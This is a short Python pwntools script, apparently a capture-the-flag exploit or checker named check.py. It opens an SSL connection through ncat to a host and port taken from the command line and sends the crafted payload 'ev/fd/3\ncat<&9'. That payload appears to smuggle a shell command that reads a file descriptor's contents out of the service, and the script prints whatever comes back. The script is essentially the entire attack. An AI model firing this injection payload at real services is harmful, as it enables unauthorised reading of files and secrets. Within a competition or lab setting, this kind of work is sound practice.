from pwn import *
import os
import time
import struct
import sys

context(arch = 'amd64', os = 'linux')

if len(sys.argv) < 3:
    print("Usage: check.py [ip] [port]")
    exit(0)

r = process(['ncat', '--ssl', sys.argv[1], sys.argv[2]])


r.sendline("ev/fd/3\ncat<&9")
print(r.recvall(timeout=2))
